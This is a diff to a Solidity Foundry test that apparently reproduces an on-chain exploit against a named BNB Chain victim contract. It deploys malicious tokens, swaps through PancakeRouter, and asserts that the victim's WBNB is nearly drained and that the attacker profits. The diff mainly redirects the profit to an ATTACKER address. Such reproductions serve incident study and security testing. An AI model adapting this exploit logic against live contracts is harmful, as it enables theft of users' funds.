@@ -28,7 +28,6 @@ address constant ATTACK_CONTRACT = 0xe603826ac124450522684c763a37D0E181984716;
 address constant VICTIM = 0x0B0d67049fc34fD8aB2559a456A80276E805c4DA;
 address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
 address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
-address constant PROFIT_RECEIVER = 0x000000000000000000000000000000000000bEEF;
 
 contract ContractTest is BaseTestWithBalanceLog {
     IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
@@ -46,14 +45,14 @@ contract ContractTest is BaseTestWithBalanceLog {
         vm.label(VICTIM, "Victim");
         vm.label(PANCAKE_ROUTER, "Pancake Router");
         vm.label(WBNB_TOKEN, "WBNB");
-        vm.label(PROFIT_RECEIVER, "Profit Receiver");
 
         fundingToken = address(0);
-        attacker = PROFIT_RECEIVER;
+        attacker = ATTACKER;
     }
 
     function testExploit() public balanceLog {
         vm.deal(address(this), 1 ether);
+        uint256 attackerBnbBefore = ATTACKER.balance;
 
         ddToken = new MaliciousToken("DD", "DD");
         secondToken = new MaliciousToken("Token57", "T57");
@@ -79,11 +78,11 @@ contract ContractTest is BaseTestWithBalanceLog {
         path[0] = address(ddToken);
         path[1] = WBNB_TOKEN;
         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            1_000_000 ether, 0, path, PROFIT_RECEIVER, block.timestamp + 1_800
+            1_000_000 ether, 0, path, ATTACKER, block.timestamp + 1_800
         );
 
         assertEq(IERC20(WBNB_TOKEN).balanceOf(VICTIM), 2_486_728, "victim WBNB should be nearly drained");
-        assertGt(PROFIT_RECEIVER.balance, 0.9 ether, "BNB profit");
+        assertGt(ATTACKER.balance - attackerBnbBefore, 0.9 ether, "BNB profit");
     }
 
     function _buildVictimCall(
